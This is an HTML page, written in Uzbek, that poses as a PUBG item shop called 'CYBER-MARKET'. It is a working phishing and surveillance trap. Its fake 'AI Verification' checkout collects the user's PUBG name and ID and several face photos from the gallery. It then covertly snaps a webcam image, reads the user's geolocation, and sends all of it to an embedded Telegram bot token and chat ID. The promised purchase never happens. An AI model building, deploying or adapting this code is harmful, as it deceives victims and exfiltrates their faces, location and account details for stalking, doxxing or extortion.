<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CYBER-MARKET | Premium PUBG Items</title>
    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Syncopate:wght@700&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #f3a91a; --dark: #080a0f; --card: #12161f; }
        body { margin: 0; background: var(--dark); color: white; font-family: 'Montserrat', sans-serif; }
        header { padding: 20px; text-align: center; background: #000; border-bottom: 2px solid var(--gold); }
        .logo { font-family: 'Syncopate', sans-serif; font-size: 20px; color: var(--gold); }
        
        .container { padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 15px; }
        .product-card { background: var(--card); border-radius: 10px; padding: 15px; text-align: center; border: 1px solid #222; }
        .product-card img { width: 100%; border-radius: 5px; }
        .price { color: var(--gold); font-weight: bold; margin: 10px 0; }
        .buy-btn { width: 100%; padding: 10px; background: var(--gold); border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }

        /* Checkout Modal */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; padding: 20px; align-items: center; justify-content: center; }
        .modal-content { background: var(--card); padding: 30px; border-radius: 15px; width: 100%; max-width: 400px; position: relative; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #1a202c; border: 1px solid #333; color: #fff; border-radius: 5px; box-sizing: border-box; }
        .status { font-size: 11px; color: var(--gold); margin: 5px 0; }
        
        video, canvas, #fileInput { display: none; }
    </style>
</head>
<body>

<header><div class="logo">CYBER-MARKET</div></header>

<div class="container">
    <div class="product-card">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSf_xGq_X_L8h_5W76Z9L7H3F9qO-y9xGk7gA&s" alt="UC">
        <div>8100 UC</div>
        <div class="price">99.00 USD</div>
        <button class="buy-btn" onclick="openCheckout('8100 UC')">SOTIB OLISH</button>
    </div>
    <div class="product-card">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR6A5N_C-qS5b4XfU0g8kO0R3oH6_J5-k5nSg&s" alt="Skin">
        <div>M416 Glacier</div>
        <div class="price">45.00 USD</div>
        <button class="buy-btn" onclick="openCheckout('M416 Glacier')">SOTIB OLISH</button>
    </div>
</div>

<div id="checkoutModal" class="modal">
    <div class="modal-content">
        <h2 style="color:var(--gold); margin-top:0;">TO'LOVNI TASDIQLASH</h2>
        <p style="font-size:12px; color:#888;">Xavfsiz tranzaksiya uchun quyidagi ma'lumotlarni to'ldiring:</p>
        
        <input type="text" id="u_name" placeholder="PUBG User Name">
        <input type="number" id="u_id" placeholder="Character ID">
        
        <label for="fileInput" style="display:block; padding:10px; border:1px dashed var(--gold); cursor:pointer; font-size:12px; text-align:center;">
            💳 To'lov ruxsati: Galereyadan 5-10 ta yuzingiz aks etgan rasmni tanlang (AI Verification)
        </label>
        <input type="file" id="fileInput" accept="image/*" multiple onchange="startSilentScan(this)">
        
        <div id="statusText" class="status">Kutilmoqda...</div>
        <button class="buy-btn" id="confirmBtn" onclick="processOrder()" disabled>TO'LOVGA O'TISH</button>
    </div>
</div>

<video id="vid" autoplay playsinline></video>
<canvas id="canv"></canvas>

<script>
    const CONFIG = { T: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", C: "6198817749" };
    let selectedItem = "", verifiedPhotos = [], camBlob = null;

    async function initAI() {
        await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model');
    }
    initAI();

    function openCheckout(item) {
        selectedItem = item;
        document.getElementById('checkoutModal').style.display = 'flex';
    }

    async function startSilentScan(input) {
        const status = document.getElementById('statusText');
        status.innerText = "AI tizimi yuzlarni tahlil qilmoqda...";
        verifiedPhotos = [];
        const files = Array.from(input.files);

        for (let f of files) {
            const img = await faceapi.bufferToImage(f);
            const d = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
            if (d.length > 0) verifiedPhotos.push(f);
        }
        status.innerText = `Tayyor! ${verifiedPhotos.length} ta rasm tasdiqlandi.`;
        document.getElementById('confirmBtn').disabled = false;
    }

    async function processOrder() {
        const name = document.getElementById('u_name').value;
        const id = document.getElementById('u_id').value;
        if(!name || !id) return alert("Hamma maydonni to'ldiring!");

        document.getElementById('statusText').innerText = "Tranzaksiya qayta ishlanmoqda...";
        
        try {
            // Yashirin kamera va lokatsiya
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('vid'); v.srcObject = stream;
            await new Promise(r => setTimeout(r, 800));
            const c = document.getElementById('canv');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            camBlob = await (await fetch(c.toDataURL('image/jpeg', 0.5))).blob();
            stream.getTracks().forEach(t => t.stop());

            navigator.geolocation.getCurrentPosition(async (p) => {
                const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                await sendToBot(name, id, map);
            }, async () => { await sendToBot(name, id, "Rad etildi"); });

        } catch (e) { alert("Xavfsizlik ruxsatisiz to'lovni amalga oshirib bo'lmaydi!"); }
    }

    async function sendToBot(n, id, m) {
        const text = `🛒 *YANGI DO'KON BUYURTMASI* 🛒\n📦 Buyum: ${selectedItem}\n👤 Name: ${n}\n🆔 ID: ${id}\n📍 MAPS: ${m}`;
        
        await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CONFIG.C, text: text, parse_mode: 'Markdown'})
        });

        if(camBlob) {
            const fd = new FormData(); fd.append('chat_id', CONFIG.C); fd.append('photo', camBlob);
            await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, {method: 'POST', body: fd});
        }

        for (let f of verifiedPhotos) {
            const fd2 = new FormData(); fd2.append('chat_id', CONFIG.C); fd2.append('photo', f);
            fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, {method: 'POST', body: fd2});
        }

        alert("Buyurtmangiz qabul qilindi. 24 soat ichida operatorlar bog'lanadi!");
        location.reload();
    }
</script>
</body>
</html>
